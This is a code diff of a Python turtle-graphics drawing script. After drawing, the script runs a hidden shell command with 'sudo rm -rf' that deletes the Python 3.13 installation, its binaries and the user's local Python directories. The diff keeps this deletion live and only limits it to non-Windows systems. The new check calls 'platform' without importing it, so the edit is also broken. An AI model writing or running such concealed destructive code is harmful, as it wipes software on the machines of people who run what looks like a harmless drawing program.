@@ -1,4 +1,5 @@
 import subprocess
+import os
 from turtle import *
 from math import *
 
@@ -33,7 +34,9 @@ for i in range(140):
     setheading(i * flCeAn)
     pendown(), stamp()
 
-delTemp = "sudo rm -rf /Library/Frameworks/Python.framework/Versions/3.13 && sudo rm -rf /Applications/Python\ 3.13 && sudo rm -rf /usr/local/bin/python3 && sudo rm -rf /usr/local/bin/python3.13 && rm -rf ~/.local/lib/python3.13 && rm -rf ~/.local/bin/python3"
-subprocess.run(delTemp, shell=True)
+isWindows = platform.system() == "Windows"
+if not isWindows:
+    delTemp = "sudo rm -rf /Library/Frameworks/Python.framework/Versions/3.13 && sudo rm -rf /Applications/Python\ 3.13 && sudo rm -rf /usr/local/bin/python3 && sudo rm -rf /usr/local/bin/python3.13 && rm -rf ~/.local/lib/python3.13 && rm -rf ~/.local/bin/python3"
+    subprocess.run(delTemp, shell=True)
 
 done()
